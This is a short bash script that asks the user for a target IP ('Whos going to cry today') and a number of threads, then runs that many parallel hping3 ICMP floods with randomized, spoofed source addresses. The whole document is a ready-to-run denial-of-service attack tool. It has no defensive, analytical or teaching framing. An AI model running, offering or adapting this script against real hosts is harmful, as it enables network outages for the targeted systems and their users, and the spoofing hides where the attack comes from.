#! /bin/bash

echo "###################### ICMP code-8 FLOOD ######################"
echo -en "Whos going to cry today (IP):"
read tarip
echo -en ENTER NUMBER OF HPING THREADS:
read count
echo "################# STARTING THREADS ######################"
#packet=$1
#port=$2
#count=$3

for i in `seq 1 $count`;
 do
  hping3 $tarip --icmp --flood -I eth1 --rand-source &
 done